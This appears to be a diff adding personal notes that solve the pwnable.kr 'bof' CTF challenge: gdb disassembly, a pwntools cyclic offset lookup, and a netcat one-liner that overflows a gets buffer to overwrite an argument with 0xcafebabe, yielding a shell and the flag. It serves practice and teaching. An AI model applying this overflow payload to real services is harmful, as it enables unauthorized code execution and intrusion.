@@ -1,0 +1,47 @@
+=============================================step1: ncat/nc, send cyclic(200) and gdb =========================================
+   ┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+   │0x8004e62b <__i686.get_pc_thunk.bx+4>   nop                                                                                                      │
+   │0x8004e62c <func>                       push   %ebp                                                                                              │
+   │0x8004e62d <func+1>                     mov    %esp,%ebp                                                                                         │
+   │0x8004e62f <func+3>                     sub    $0x48,%esp                                                                                        │
+b+ │0x8004e632 <func+6>                     mov    %gs:0x14,%eax                                                                                     │
+   │0x8004e638 <func+12>                    mov    %eax,-0xc(%ebp)                                                                                   │
+   │0x8004e63b <func+15>                    xor    %eax,%eax                                                                                         │
+   │0x8004e63d <func+17>                    movl   $0x8004e78c,(%esp)                                                                                │
+   │0x8004e644 <func+24>                    call   0xb7608ce0 <_IO_puts>                                                                             │
+   │0x8004e649 <func+29>                    lea    -0x2c(%ebp),%eax                                                                                  │
+   │0x8004e64c <func+32>                    mov    %eax,(%esp)                                                                                       │
+   │0x8004e64f <func+35>                    call   0xb76084b0 <_IO_gets>                                                                             │
+B+>│0x8004e654 <func+40>                    cmpl   $0xcafebabe,0x8(%ebp)                                                                             │
+   │0x8004e65b <func+47>                    jne    0x8004e66b <func+63>                                                                              │
+   │0x8004e65d <func+49>                    movl   $0x8004e79b,(%esp)                                                                                │
+   │0x8004e664 <func+56>                    call   0xb75e1d00 <__libc_system>                                                                        │
+   │0x8004e669 <func+61>                    jmp    0x8004e677 <func+75>                                                                              │
+   │0x8004e66b <func+63>                    movl   $0x8004e7a3,(%esp)                                                                                │
+   │0x8004e672 <func+70>                    call   0xb7608ce0 <_IO_puts>                                                                             │
+   │0x8004e677 <func+75>                    mov    -0xc(%ebp),%eax                                                                                   │
+   └─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+record-ful process 4891 In: func                                                                                                 L??   PC: 0x8004e654 
+(gdb) x/10xw $ebp+8
+0xbfea6000:     0x6161616e      0x6161616f      0x61616170      0x61616171
+0xbfea6010:     0x61616172      0x61616173      0x61616174      0x61616175
+0xbfea6020:     0x61616176      0x61616177
+(gdb) 
+
+=============================================step2: find 0xcafebabe address ======================================
+>>> from pwn import *
+>>> cyclic(200).find(p32(0x6161616e))
+52
+
+=============================================step3: pwn ==========================================================
+iits@zjnbwangwm1z-PC ~/desktop/pwnable
+$ (python -c "print 'A'*52+'\xbe\xba\xfe\xca'+'\n'"; cat) | nc pwnable.kr 9000
+ls
+bof
+bof.c
+flag
+log
+super.pl
+cat flag
+daddy, I just pwned a buFFer :)
+
